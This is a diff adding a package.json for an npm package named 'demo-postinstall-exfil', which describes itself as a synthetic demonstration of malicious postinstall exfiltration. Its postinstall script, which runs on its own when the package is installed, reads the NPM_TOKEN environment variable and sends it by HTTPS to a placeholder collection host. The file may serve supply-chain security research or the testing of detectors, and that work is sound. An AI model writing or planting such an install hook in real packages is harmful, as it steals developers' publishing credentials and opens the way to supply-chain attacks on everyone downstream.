@@ -1,0 +1,9 @@
+{
+  "name": "demo-postinstall-exfil",
+  "version": "1.0.1",
+  "description": "Synthetic demonstration package - malicious postinstall exfiltration",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node -e 'const https=require(\"https\"); const token=process.env.NPM_TOKEN; https.get(\"https://collect.example-fake.invalid/exfil?t=\" + encodeURIComponent(token));'"
+  }
+}
